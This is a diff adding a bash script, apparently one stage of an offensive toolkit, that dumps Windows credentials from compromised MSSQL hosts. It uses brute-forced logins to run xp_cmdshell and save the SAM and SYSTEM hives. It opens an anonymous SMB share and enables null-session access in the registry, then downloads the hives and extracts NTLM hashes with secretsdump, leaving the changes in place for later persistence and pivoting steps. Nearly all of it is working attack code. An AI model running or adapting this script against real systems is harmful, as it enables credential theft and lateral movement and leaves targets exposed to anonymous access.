@@ -1,0 +1,115 @@
+#!/usr/bin/env bash
+
+# 04_hashdump — Post-Exploitation Credential Dumping
+
+# For each compromised MSSQL host:
+#   1. Dumps SAM and SYSTEM registry hives via xp_cmdshell
+#   2. Creates a temporary anonymous SMB share on the target
+#   3. Downloads hive files to the local loot directory
+#   4. Extracts NTLM hashes with secretsdump
+
+# NOTE: Remote artifact cleanup (SMB share, temp files, registry tweaks)
+#       is handled by 07_cleanup, NOT here. This keeps the artifacts in
+#       place so that later scripts (05_persist, 06_pivot) can still
+#       interact with the target if needed.
+
+OUTDIR="./recon"
+CREDS_FILE="$OUTDIR/hosts/mssql-creds.txt"
+LOOT_DIR="$OUTDIR/loot"
+mkdir -p "$LOOT_DIR"
+
+LHOST=$(ip -br a | grep -v '^lo' | awk '{print $3}' | cut -d/ -f1 | head -1)
+
+if [[ ! -f "$CREDS_FILE" ]]; then
+    echo "[-] $CREDS_FILE not found. Run 02_bruteforce first."
+    exit 1
+fi
+
+echo "[*] Starting post-exploitation credential dump phase"
+echo "[*] Attacker IP: $LHOST"
+echo ""
+
+while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
+    echo "[*] Target: $TARGET_IP:$TARGET_PORT  |  User: $USER"
+
+    SAFE_TARGET="${TARGET_IP//./_}"
+    LOOT_SUBDIR="$LOOT_DIR/${SAFE_TARGET}"
+    mkdir -p "$LOOT_SUBDIR"
+
+    # Helper: run a single OS command via xp_cmdshell
+    xp() {
+        local CMD="$1"
+        printf "exec master..xp_cmdshell '%s';\nexit\n" "$CMD" | \
+            mssqlclient "${USER}:${PASS}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1
+    }
+
+    echo "[*] Step 1: Saving SAM and SYSTEM registry hives to C:\\Windows\\Temp..."
+    xp "c:\\windows\\system32\\reg.exe save HKLM\\SAM c:\\windows\\temp\\sam /y" | \
+        grep -v "^$\|SQL\|Impacket\|Press\|\[!\]"
+    xp "c:\\windows\\system32\\reg.exe save HKLM\\SYSTEM c:\\windows\\temp\\sys /y" | \
+        grep -v "^$\|SQL\|Impacket\|Press\|\[!\]"
+
+    # Verify files exist on target
+    DIR_OUTPUT=$(xp "dir c:\\windows\\temp\\sam c:\\windows\\temp\\sys" 2>&1)
+    if echo "$DIR_OUTPUT" | grep -qi "sam\|sys"; then
+        echo "[+] Hive files confirmed on target."
+    else
+        echo "[-] Could not confirm hive files on target. Proceeding anyway..."
+    fi
+
+    echo "[*] Step 2: Setting permissions for exfil..."
+    xp "cacls c:\\windows\\temp\\sam /E /G \"Everyone\":F" > /dev/null 2>&1
+    xp "cacls c:\\windows\\temp\\sys /E /G \"Everyone\":F" > /dev/null 2>&1
+    xp "cacls c:\\windows\\temp\\sam /E /G \"Anonymous Logon\":F" > /dev/null 2>&1
+    xp "cacls c:\\windows\\temp\\sys /E /G \"Anonymous Logon\":F" > /dev/null 2>&1
+    xp "cacls c:\\windows\\temp /E /G \"Anonymous Logon\":F" > /dev/null 2>&1
+    echo "[+] Permissions set."
+
+    echo "[*] Step 3: Creating anonymous SMB share 'pentest'..."
+    xp "net share pentest=c:\\windows\\temp /GRANT:\"Anonymous Logon,FULL\" /GRANT:\"Everyone,FULL\"" | \
+        grep -v "^$\|SQL\|Impacket\|Press\|\[!\]"
+
+    echo "[*] Step 4: Configuring registry for anonymous SMB access..."
+    xp "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v RestrictNullSessAccess /t REG_DWORD /d 0 /f" > /dev/null 2>&1
+    xp "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v NullSessionShares /t REG_MULTI_SZ /d pentest /f" > /dev/null 2>&1
+
+    echo "[*] Step 5: Restarting LanmanServer for changes to take effect..."
+    xp "net stop LanmanServer" > /dev/null 2>&1
+    sleep 3
+    xp "net start LanmanServer" > /dev/null 2>&1
+    sleep 3
+    echo "[+] LanmanServer restarted."
+
+    echo "[*] Step 6: Downloading SAM and SYSTEM hives via smbclient..."
+    SAM_FILE="$LOOT_SUBDIR/sam"
+    SYS_FILE="$LOOT_SUBDIR/sys"
+
+    smbclient "\\\\${TARGET_IP}\\pentest" -N \
+        -c "get sam ${SAM_FILE}; get sys ${SYS_FILE}" 2>&1 | \
+        grep -v "^$"
+
+    if [[ -f "$SAM_FILE" && -f "$SYS_FILE" ]]; then
+        echo "[+] Hive files downloaded:"
+        ls -lh "$SAM_FILE" "$SYS_FILE" | sed 's/^/    /'
+    else
+        echo "[-] Download failed. Check SMB share config on target."
+        echo "    Try manually: smbclient \\\\\\\\${TARGET_IP}\\\\pentest -N"
+        continue
+    fi
+
+    echo "[*] Step 7: Extracting NTLM hashes with secretsdump..."
+    HASH_FILE="$LOOT_SUBDIR/hashes.txt"
+    secretsdump.py -sam "$SAM_FILE" -system "$SYS_FILE" LOCAL 2>&1 | \
+        tee "$HASH_FILE"
+
+    echo ""
+    echo "[+] Hashes saved to $HASH_FILE"
+    echo ""
+    echo "[+] Post-exploitation complete for $TARGET_IP"
+    echo "    Loot saved in: $LOOT_SUBDIR/"
+
+done < "$CREDS_FILE"
+
+echo ""
+echo "[+] All targets processed. Loot directory contents:"
+find "$LOOT_DIR" -type f | sed 's/^/    /'
